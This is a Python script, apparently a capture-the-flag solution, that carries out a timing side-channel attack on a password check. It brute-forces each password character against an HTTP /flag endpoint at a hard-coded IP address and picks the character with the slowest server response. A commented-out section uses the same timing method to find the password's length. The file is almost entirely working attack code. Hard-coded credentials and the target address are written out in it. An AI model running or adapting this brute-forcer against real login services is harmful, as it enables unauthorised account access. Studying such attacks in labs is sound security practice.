import subprocess
import string
from collections import Counter

hm = {}

printables = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$()*+,-./:;<=>?@[\]^_`{|}~"

# for char in printables:
#   if char == "[" or char == "]" or char == "{" or char == "}":
#     char = "\\" + char
#   hm[char] = 0

password = list("r1g3boj8455871326i3w")
username = "0p3nr4leaf"

for j in range(19, 20):
  for i in range(3):
    for char in printables:
      if char == "[" or char == "]" or char == "{" or char == "}":
        char = "\\" + char
      password[j] = char
      shellscript = subprocess.Popen(["./curltime.sh", f"http://206.189.89.253:31179/flag?username={username}&password={''.join(password)}"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
      for line in iter(shellscript.stdout.readline, ""):
        output = line.strip()
        if output != b'':
          if output.startswith(b'time_pretransfer'):
            pre = float(output[-8:].decode("utf-8"))
          if output.startswith(b'time_starttransfer'):
            start = float(output[-8:].decode("utf-8"))
            print(f"Password: {''.join(password)} | Server time: {start-pre} | i: {i}")
            if char not in hm:
              hm[char] = (start-pre)
            else:
              hm[char] = min(hm[char], start-pre)
        else:
          break


  c = Counter(hm)
  mc = c.most_common(10)
  print(mc)

  chosen = mc[0][0]
  password[j] = chosen 

  print("Chosen: ", "".join(password))

  hm = {}

# username = "0p3nr4leaf"

# for i in range(1, 21):
#   for j in range(10):
#     url = f"http://206.189.89.253:31179/flag?username={username}&password={'a' * i}"
#     print(url)
#     shellscript = subprocess.Popen(["./curltime.sh", url], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#     for line in iter(shellscript.stdout.readline, ""):
#       output = line.strip()
#       if output != b'':
#         if output.startswith(b'time_pretransfer'):
#           pre = float(output[-8:].decode("utf-8"))
#         if output.startswith(b'time_starttransfer'):
#           start = float(output[-8:].decode("utf-8"))
#           print(f"Username: {''.join(username)} | Server time: {start-pre} | i: {i}")
#           if i not in hm:
#             hm[i] = (start-pre)
#           else:
#             hm[i] = min(hm[i], start-pre)
#       else:
#         break

# c = Counter(hm)
# mc = c.most_common(10)
# print(mc)
